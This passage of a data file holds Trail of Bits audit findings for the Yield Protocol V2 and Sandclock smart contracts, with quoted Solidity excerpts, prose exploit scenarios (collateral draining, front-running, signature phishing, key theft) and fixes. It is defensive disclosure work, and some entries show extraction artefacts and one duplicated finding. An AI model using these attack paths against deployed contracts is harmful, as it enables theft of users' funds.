Recommendations Short term, document the risks associated with the use of msg.value and ensure that all developers are aware of this potential attack vector. Long term, detail the security implications of all functions in both the documentation and the code to ensure that potential attack vectors do not become exploitable when code is refactored or added. References  Two Rights Might Make a Wrong, Paradigm 18 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Lack of two-step process for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The _give function in the Cauldron contract transfers the ownership of a vault in a single step. There is no way to reverse a one-step transfer of ownership to an address without an owner (i.e., an address with a private key not held by any user). This would not be the case if ownership were transferred through a two-step process in which an owner proposed a transfer and the prospective recipient accepted it. /// @dev Transfer a vault to another user. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); Figure 3.1: vault-v2/contracts/Cauldron.sol#L227-L237 Exploit Scenario Alice, a Yield Protocol user, transfers ownership of her vault to her friend Bob. When entering Bobs address, Alice makes a typo. As a result, the vault is transferred to an address with no owner, and Alices funds are frozen. Recommendations Short term, use a two-step process for ownership transfers. Additionally, consider adding a zero-value check of the receivers address to ensure that vaults cannot be transferred to the zero address. Long term, use a two-step process for all irrevocable critical operations. 19 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Risks associated with use of ABIEncoderV2 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The contracts use Soliditys ABIEncoderV2, which is enabled by default in Solidity version 0.8. This encoder has caused numerous issues in the past, and its use may still pose risks. More than 3% of all GitHub issues for the Solidity compiler are related to current or former experimental features, primarily ABIEncoderV2, which was long considered experimental. Several issues and bug reports are still open and unresolved. ABIEncoderV2 has been associated with more than 20 high-severity bugs, some of which are so recent that they have not yet been included in a Solidity release. For example, in March 2019 a severe bug introduced in Solidity 0.5.5 was found in the encoder. Exploit Scenario The Yield Protocol smart contracts are deployed. After the deployment, a bug is found in the encoder, which means that the contracts are broken and can all be exploited in the same way. Recommendations Short term, use neither ABIEncoderV2 nor any experimental Solidity feature. Refactor the code such that structs do not need to be passed to or returned from functions. Long term, integrate static analysis tools like Slither into the continuous integration pipeline to detect unsafe pragmas. 20 Yield V2", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "5. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Although dependency scans did not yield a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. NPM Advisory", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Witchs buy and payAll functions allow users to buy collateral from vaults not undergoing auctions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The buy and payAll functions in the Witch contract enable users to buy collateral at an auction. However, neither function checks whether there is an active auction for the collateral of a vault. As a result, anyone can buy collateral from any vault. This issue also creates an arbitrage opportunity, as the collateral of an overcollateralized vault can be bought at a below-market price. An attacker could drain vaults of their funds and turn a prot through repeated arbitrage. Exploit Scenario Alice, a user of the Yield Protocol, opens an overcollateralized vault. Attacker Bob calls payAll on Alices vault. As a result, Alices vault is liquidated, and she loses the excess collateral (the portion that made the vault overcollateralized). Recommendations Short term, ensure that buy and payAll fail if they are called on a vault for which there is no active auction. Long term, ensure that all functions revert if the system is in a state in which they are not allowed to be called. 22 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol V2 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Yield Protocol V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 23 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Risks associated with EIP-2612 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The use of EIP-2612 increases the risk of permit function front-running as well as phishing attacks. EIP-2612 uses signatures as an alternative to the traditional approve and transferFrom ow. These signatures allow a third party to transfer tokens on behalf of a user, with verication of a signed message. The use of EIP-2612 makes it possible for an external party to front-run the permit function by submitting the signature rst. Then, since the signature has already been used and the funds have been transferred, the actual caller's transaction will fail. This could also aect external contracts that rely on a successful permit() call for execution. EIP-2612 also makes it easier for an attacker to steal a users tokens through phishing by asking for signatures in a context unrelated to the Yield Protocol contracts. The hash message may look benign and random to the user. Exploit Scenario Bob has 1,000 iTokens. Eve creates an ERC20 token with a malicious airdrop called ProofOfSignature. To claim the tokens, participants must sign a hash. Eve generates a hash to transfer 1,000 iTokens from Bob. Eve asks Bob to sign the hash to get free tokens. Bob signs the hash, and Eve uses it to steal Bobs tokens. Recommendations Short term, develop user documentation on edge cases in which the signature-forwarding process can be front-run or an attacker can steal a users tokens via phishing. Long term, document best practices for Yield Protocol users. In addition to taking other precautions, users must do the following:  Be extremely careful when signing a message  Avoid signing messages from suspicious sources 24 Yield V2  Always require hashing schemes to be public References  EIP-2612 Security Considerations 25 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Failure to use the batched transaction ow may enable theft through front-running ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol relies on users interacting with the Ladle contract to batch their transactions (e.g., to transfer funds and then mint/burn the corresponding tokens in the same series of transactions). When they deviate from the batched transaction ow, users may lose their funds through front-running. For example, an attacker could front-run the startPool() function to steal the initial mint of strategy tokens. The function relies on liquidity provider (LP) tokens to be transferred to the Strategy contract and then used to mint strategy tokens. The rst time that strategy tokens are minted, they are minted directly to the caller: /// @dev Start the strategy investments in the next pool /// @notice When calling this function for the first pool, some underlying needs to be transferred to the strategy first, using a batchable router. function startPool() external poolNotSelected { [...] // Find pool proportion p = tokenReserves/(tokenReserves + fyTokenReserves) // Deposit (investment * p) base to borrow (investment * p) fyToken // (investment * p) fyToken + (investment * (1 - p)) base = investment // (investment * p) / ((investment * p) + (investment * (1 - p))) = p // (investment * (1 - p)) / ((investment * p) + (investment * (1 - p))) = 1 - p uint256 baseBalance = base.balanceOf(address(this)); 26 Yield V2 require(baseBalance > 0, \"No funds to start with\"); uint256 baseInPool = base.balanceOf(address(pool_)); uint256 fyTokenInPool = fyToken_.balanceOf(address(pool_)); uint256 baseToPool = (baseBalance * baseInPool) / (baseInPool + fyTokenInPool); // Rounds down uint256 fyTokenToPool = baseBalance - baseToPool; // fyTokenToPool is rounded up // Mint fyToken with underlying base.safeTransfer(baseJoin, fyTokenToPool); fyToken.mintWithUnderlying(address(pool_), fyTokenToPool); // Mint LP tokens with (investment * p) fyToken and (investment * (1 - p)) base base.safeTransfer(address(pool_), baseToPool); (,, cached) = pool_.mint(address(this), true, 0); // We don't care about slippage, because the strategy holds to maturity and profits from sandwiching if (_totalSupply == 0) _mint(msg.sender, cached); // Initialize the strategy if needed invariants[address(pool_)] = pool_.invariant(); // Cache the invariant to help the frontend calculate profits emit PoolStarted(address(pool_)); } Figure 9.1: strategy-v2/contracts/Strategy.sol#L146-L194 Exploit Scenario Bob adds underlying tokens to the Strategy contract without using the router. Governance calls setNextPool() with a new pool address. Eve, an attacker, front-runs the call to the startPool() function to secure the strategy tokens initially minted for Bobs underlying tokens. Recommendations Short term, to limit the impact of function front-running, avoid minting tokens to the callers of the protocols functions. 27 Yield V2 Long term, document the expectations around the use of the router to batch transactions; that way, users will be aware of the front-running risks that arise when it is not used. Additionally, analyze the implications of all uses of msg.sender in the system, and ensure that users cannot leverage it to obtain tokens that they do not deserve; otherwise, they could be incentivized to engage in front-running. 28 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "10. Strategy contracts balance-tracking system could facilitate theft ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2 11. Insu\u0000cient protection of sensitive keys Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-YP2-011 Target: hardhat.config.js", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "12. Lack of limits on the total amount of collateral sold at auction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "MakerDAOs Dutch auction system imposes limits on the amount of collateral that can be auctioned o at once (both the total amount and the amount of each collateral type). If the MakerDAO system experienced a temporary oracle failure, these limits would prevent a catastrophic loss of all collateral. The Yield Protocol auction system is similar to MakerDAOs but lacks such limits, meaning that all of its collateral could be auctioned o for below-market prices. Exploit Scenario The oracle price feeds (or other components of the system) experience an attack or another issue. The incident causes a majority of the vaults to become undercollateralized, triggering auctions of those vaults collateral. The protocol then loses the majority of its collateral, which is auctioned o for below-market prices, and enters an undercollateralized state from which it cannot recover. Recommendations Short term, introduce global and type-specic limits on the amount of collateral that can be auctioned o at the same time. Ensure that these limits protect the protocol from total liquidation caused by bugs while providing enough liquidation throughput to accommodate all possible price changes. Long term, wherever possible, introduce limits for the systems variables to ensure that they remain within the expected ranges. These limits will minimize the impact of bugs or attacks against the system. 33 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Lack of incentives for calls to Witch.auction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Users call the Witch contracts auction function to start auctions for undercollateralized vaults. To reduce the losses incurred by the protocol, this function should be called as soon as possible after a vault has become undercollateralized. However, the Yield Protocol system does not provide users with a direct incentive to call Witch.auction. By contrast, the MakerDAO system provides rewards to users who initialize auctions. Exploit Scenario A stock market crash triggers a crypto market crash. The numerous corrective arbitrage transactions on the Ethereum network cause it to become congested, and gas prices skyrocket. To keep the Yield Protocol overcollateralized, many undercollateralized vaults must be auctioned o. However, because of the high price of calls to Witch.auction, and the lack of incentives for users to call it, too few auctions are timely started. As a result, the system incurs greater losses than it would have if more auctions had been started on time. Recommendations Short term, reward those who call Witch.auction to incentivize users to call the function (and to do so as soon as possible). Long term, ensure that users are properly incentivized to perform all important operations in the protocol. 34 Yield V2", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "14. Contracts used as dependencies do not track upstream changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Math64x64 has been copied and pasted into the yieldspace-v2 repository. The code documentation does not specify the exact revision that was made or whether the code was modied. As such, the contracts will not reliably reect updates or security xes implemented in this dependency, as those changes must be manually integrated into the contracts. Exploit Scenario Math64x64 receives an update with a critical x for a vulnerability. An attacker detects the use of a vulnerable contract and can then exploit the vulnerability against any of the Yield Protocol contracts that use Math64x64. Recommendations Short term, review the codebase and document the source and version of the dependency. Include third-party sources as submodules in your Git repositories to maintain internal path consistency and ensure that any dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project. 35 Yield V2", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "15. Cauldrons give and tweak functions lack vault existence checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Cauldron depends on the caller (the Ladle) to perform a check that is critical to the internal consistency of the Cauldron. The Cauldron should provide an API that makes the creation of malformed vaults impossible. The Cauldron contracts give(vaultId, receiver) function does not check whether the vaultId passed to it is associated with an existent vault. If the ID is not that of an existent vault, the protocol will create a new vault, with the owner set to receiver and all other elds set to zero. The existence of such a malformed vault could have negative consequences for the protocol. For example, the build function checks the existence of a vault by verifying that vault.seriesId is not zero. The build function could be abused to set the seriesId and ilkId of a malformed vault. The Cauldrons tweak function also fails to check the existence of the vault it operates on and can be used to create a vault without an owner. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); /// @dev Transfer a vault to another user. function give(bytes12 vaultId, address receiver) external auth returns(DataTypes.Vault memory vault) 36 Yield V2 { } vault = _give(vaultId, receiver); Figure 15.1: The give and _give functions in the Cauldron contract (vault-v2/contracts/Cauldron.sol#L228-L246) Exploit Scenario Bob, a Yield Protocol developer, adds a new public function that calls Cauldron.give and does not perform a vault existence check. Any user can call the function to create a malformed vault, with unclear consequences for the protocol. Recommendations Short term, ensure that the protocol performs zero-value checks for all values that should not be set to zero. Long term, follow the guidance on data validation laid out in TOB-YP2-016. 37 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "16. Problematic approach to data validation and access controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Many parts of the codebase lack data validation. The Yield team indicated that these omissions were largely intentional, as it is the responsibility of the front end of other contracts to ensure that data is valid. The codebase lacks zero-value checks for the following parameters (among others):  The parameters of LadleStorage.constructor  The receiver parameter of Cauldron._give  The parameters of Ladle.give  The to parameter of Pool.buyBase and Pool.sellBase  The oracle parameter of Cauldron.setLendingOracle and Cauldron.setSpotOracle  The owner parameter of Cauldron.build  The value parameter of FYToken.point  The parameters of Witch.constructor It also lacks zero-value checks for the module parameter of Ladle.moduleCall and Ladle.addModule, and the moduleCall and addModule functions do not perform contract existence checks. Moreover, many functions do not contain exhaustive data validation and instead rely on their caller or callee to partially handle data validation. As a result, the protocols data validation is spread across multiple functions and, in certain cases, across multiple contracts. For example, the Cauldron contracts give and tweak functions (likely among others) require the caller, which is usually the Ladle, to check the existence of the vault being modied. The Ladle is therefore responsible for ensuring the integrity of the Cauldrons internal data. This diuse system of data validation requires developers and auditors to increase their focus on the context of a call, making their work more dicult. More importantly, though, it makes the code less robust. Developers cannot modify a function in isolation; instead, they 38 Yield V2 have to look at all call sites to ensure that required validation is performed. This process is error-prone and increases the likelihood that high-severity issues (like that described in TOB-YP2-006) will be introduced into the system. The deduplication of these checks (such that data validation occurs only once per call stack) is not a secure coding practice; nor is the omission of data validation. We strongly believe that code intended to securely handle millions of dollars in assets should be developed using the most secure coding practices possible. The protocols micro-optimizations do not appear to have any benets beyond a reduction in gas costs. However, these savings are minor. For example, performing a zero check of a value already on the stack would cost 3 units of gas (see the ISZERO opcode). Even with a fairly high gas price of 200 gwei and an ether price of $3,000, this operation would cost $0.0018. Performing 10 additional zero-value checks per transaction would cost only around 2 cents. Similarly, a read of a value in cold storage would have a gas cost of 2,100 (see the SLOAD opcode); with the values above, that would be about $1.20. Warm access (that is, an additional read operation from the same storage slot within the same transaction) would cost only 100 units of gas, or about 6 cents. We believe the low cost of these checks to be a reasonable price for the increased robustness that would accompany additional data validation. We do not agree that it is best to omit these checks, as the relatively small gas savings come at the expense of defense in depth, which is more important. Exploit Scenario A Yield Protocol developer adds a new function that calls a pre-existing function. This pre-existing function makes implicit assumptions about the data validation that will occur before it is called. However, the developer is not fully aware of these implicit assumptions and accidentally leaves out important data validation, creating an attack vector that can be used to steal funds from the protocol. Recommendations Long term, ensure that the protocols functions perform exhaustive validation of their inputs and of the systems state and that they do not assume that validation has been performed further up in the call stack (or will be performed further down). Such assumptions make the code brittle and increase the likelihood that vulnerabilities will be introduced when the code is modied. Any implicit assumptions regarding data validation or access controls should be explicitly documented; otherwise, modications to the code could break those important assumptions. 39 Yield V2 In general, a contract should not assume that its functions will always be called with valid data or that those calls will be made only when the state of the system allows it. This applies even to functions that can be called only by the protocols contracts, as a protocol contract could be replaced by a malicious version. An additional layer of defense could mitigate the fallout of such a scenario. 40 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. isContract may behave unexpectedly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol system relies on the isContract() function in a few of the Solidity les to check whether there is a contract at the target address. However, in Solidity, there is no general way to denitively determine that, as there are several edge cases in which the underlying function extcodesize() can return unexpected results. In addition, there is no way to guarantee that an address that is that of a contract (or one that is not) will remain that way in the future. library IsContract { /// @dev Returns true if `account` is a contract. function isContract(address account) internal view returns (bool) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. return account.code.length > 0; } } Figure 17.1: yield-utils-v2/contracts/utils/IsContract.sol#L6-L14 Exploit Scenario A function, f, within the Yield Protocol codebase calls isContract() internally to guarantee that a certain method is not callable by another contract. An attacker creates a contract that calls f from within its constructor, and the call to isContract() within f returns false, violating the guarantee. Recommendations Short term, clearly document for developers that isContract() is not guaranteed to return an accurate value, and emphasize that it should never be used to provide an assurance of security. Long term, be mindful of the fact that the Ethereum core developers consider it poor practice to attempt to dierentiate between end users and contracts. Try to avoid this practice entirely if possible. 41 Yield V2", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "10. Strategy contracts balance-tracking system could facilitate theft ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "11. Insu\u0000cient protection of sensitive keys ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Sensitive information such as Etherscan keys, API keys, and an owner private key used in testing is stored in the process environment. This method of storage could make it easier for an attacker to compromise the keys; compromise of the owner key, for example, could enable an attacker to gain owner privileges and steal funds from the protocol. The following portion of the hardhat.config.js le uses secrets from the process environment: let mnemonic = process.env.MNEMONIC if (!mnemonic) { try { mnemonic = fs.readFileSync(path.resolve(__dirname, '.secret')).toString().trim() } catch(e){} } const accounts = mnemonic ? { mnemonic, }: undefined let etherscanKey = process.env.ETHERSCANKEY if (!etherscanKey) { try { etherscanKey = fs.readFileSync(path.resolve(__dirname, '.etherscanKey')).toString().trim() } catch(e){} } Figure 11.1: vault-v2/hardhat.config.ts#L67-L82 31 Yield V2 Exploit Scenario Alice, a member of the Yield team, has secrets stored in the process environment. Eve, an attacker, gains access to Alices device and extracts the Infura and owner keys from it. Eve then launches a denial-of-service attack against the front end of the system and uses the owner key to steal the funds held by the owner on the mainnet. Recommendations Short term, to prevent attackers from accessing system funds, avoid using hard-coded secrets or storing secrets in the process environment. Long term, use a hardware security module to ensure that keys can never be extracted. 32 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "18. Use of multiple repositories ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Yield Protocol code is spread across four repositories. These repositories are tightly coupled, and the code is broken up somewhat arbitrarily. This makes it more dicult to navigate the codebase and to obtain a complete picture of the code that existed at any one time. It also makes it impossible to associate one version of the protocol with one commit hash. Instead, each version requires four commit hashes. Exploit Scenario The master branch of one repository of the protocol is not compatible with the master branch of another. The contracts incompatibility leads to problems when a new version of the protocol is deployed. Recommendations To maintain one canonical version of the protocol, avoid using multiple repositories for the contracts. 42 Yield V2 A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. receiveFlashLoan does not account for fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The receiveFlashLoan functions of the scWETHv2 and scUSDCv2 vaults ignore the Balancer ash loan fees and repay exactly the amount that was loaned. This is not currently an issue because the Balancer vault does not charge any fees for ash loans. However, if Balancer implements fees for ash loans in the future, the Sandclock vaults would be prevented from withdrawing investments back into the vault. function flashLoan ( IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256 [] memory amounts, bytes memory userData ) external override nonReentrant whenNotPaused { uint256 [] memory feeAmounts = new uint256 [](tokens.length); uint256 [] memory preLoanBalances = new uint256 [](tokens.length); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 amount = amounts[i]; preLoanBalances[i] = token.balanceOf( address ( this )); feeAmounts[i] = _calculateFlashLoanFeeAmount(amount); token.safeTransfer( address (recipient), amount); } recipient.receiveFlashLoan(tokens, amounts, feeAmounts , userData); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 preLoanBalance = preLoanBalances[i]; uint256 postLoanBalance = token.balanceOf( address ( this )); uint256 receivedFeeAmount = postLoanBalance - preLoanBalance; _require(receivedFeeAmount >= feeAmounts[i]); _payFeeAmount(token, receivedFeeAmount); } } Figure 1.1: Abbreviated code showing the receivedFeeAmount check in the Balancer flashLoan method in 0xBA12222222228d8Ba445958a75a0704d566BF2C8#code#F5#L78 In the Balancer flashLoan function , shown in gure 1.1, the contract calls the recipients receiveFlashLoan function with four arguments: the addresses of the tokens loaned, the amounts for each token, the fees to be paid for the loan for each token, and the calldata provided by the caller. The Sandclock vaults ignore the fee amount and repay only the principal, which would lead to reverts if the fees are ever changed to nonzero values. Although this problem is present in multiple vaults, the receiveFlashLoan implementation of the scWETHv2 contract is shown in gure 1.2 as an illustrative example: function receiveFlashLoan ( address [] memory , uint256 [] memory amounts, uint256 [] memory , bytes memory userData) external { _isFlashLoanInitiated(); // the amount flashloaned uint256 flashLoanAmount = amounts[ 0 ]; // decode user data bytes [] memory callData = abi.decode(userData, ( bytes [])); _multiCall(callData); // payback flashloan asset.safeTransfer( address (balancerVault), flashLoanAmount ); _enforceFloat(); } Figure 1.2: The feeAmounts parameter is ignored by the receiveFlashLoan method. ( sandclock-contracts/src/steth/scWETHv2.sol#L232L249 ) Exploit Scenario After Sandclocks scUSDv2 and scWETHv2 vaults are deployed and users start depositing assets, the Balancer governance system decides to start charging fees for ash loans. Users of the Sandclock protocol now discover that, apart from the oat margin, most of their funds are locked because it is impossible to use the ash loan functions to withdraw vault assets from the underlying investment pools. Recommendations Short term, use the feeAmounts parameter in the calculation for repayment to account for future Balancer ash loan fees. This will prevent unexpected reverts in the ash loan handler function. Long term, document and justify all ignored arguments provided by external callers. This will facilitate a review of the systems third-party interactions and help prevent similar issues from being introduced in the future.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Reward token distribution rate can diverge from reward token balance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The privileged distributor role is responsible for transferring reward tokens to the RewardTracker contract and then passing the number of tokens sent as the _reward parameter to the notifyRewardAmount method. However, the _reward parameter provided to this method can be larger than the number of reward tokens transferred. Given the accounting for leftover rewards, such a situation would be dicult to recover from. /// @notice Lets a reward distributor start a new reward period. The reward tokens must have already /// been transferred to this contract before calling this function. If it is called /// when a reward period is still active, a new reward period will begin from the time /// of calling this function, using the leftover rewards from the old reward period plus /// the newly sent rewards as the reward. /// @dev If the reward amount will cause an overflow when computing rewardPerToken, then /// this function will revert. /// @param _reward The amount of reward tokens to use in the new reward period. function notifyRewardAmount ( uint256 _reward ) external onlyDistributor { _notifyRewardAmount(_reward); } Figure 2.1: The comment on the notifyRewardAmount method hints at an unenforced assumption that the number of reward tokens transferred must be equal to the _reward parameter provided. ( sandclock-contracts/src/staking/RewardTracker.sol#L185L195 ) If a _reward value smaller than the actual number of transferred tokens is provided, the situation can be xed by calling notifyRewardAmount again with a _reward parameter that accounts for the dierence between the RewardTracker contracts actual token balance and the rewards already scheduled for distribution. This solution is possible because the _notifyRewardAmount helper function accounts for leftover rewards if it is called during an ongoing reward period. function _notifyRewardAmount ( uint256 _reward ) internal { ... uint64 rewardRate_ = rewardRate; uint64 periodFinish_ = periodFinish; uint64 duration_ = duration; ... if ( block.timestamp >= periodFinish_) { newRewardRate = _reward / duration_; } else { uint256 remaining = periodFinish_ - block.timestamp ; uint256 leftover = remaining * rewardRate_; newRewardRate = (_reward + leftover ) / duration_; } Figure 2.2: The accounting for leftover rewards in the _notifyRewardAmount helper method ( sandclock-contracts/src/staking/RewardTracker.sol#L226L262 ) This accounting for leftover rewards, however, makes the situation dicult to recover from if a _reward parameter that is too large is provided to the notifyRewardAmount method. As shown by the arithmetic in gure 2.2, if the reward period has not nished, the code for creating the newRewardRate value can only add to the reward distribution, not subtract from it. The only way to bring a too-large reward distribution back in line with the RewardTracker contracts reward token balance is to transfer additional reward tokens to the contract. Exploit Scenario The RewardTracker distributor transfers 10 reward tokens to the RewardTracker contract and then mistakenly calls the notifyRewardAmount method with a _reward parameter of 100. Some users call the claimRewards method early and receive inated rewards until the contracts balance is depleted, leaving later users unable to claim any rewards. To recover, the distributor either needs to provide another 90 reward tokens to the RewardTracker contract or accept the reputational loss of allowing this miscongured reward period to nish before resetting the reward payouts correctly during the next period. Recommendations Short term, modify the _notifyRewardAmount helper function to reset the rewardRate so that it is in line with the current rewardToken balance and the time remaining in the reward period. This change could also allow the fetchRewards method to maintain its current behavior but with only a single rewardToken.balanceOf external call. Long term, review the internal accounting state variables and document the ways in which they are inuenced by the actual ow of funds. Pay attention to any internal accounting values that can be inuenced by external sources, including privileged accounts, and reexamine the systems assumptions surrounding the ow of funds.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. 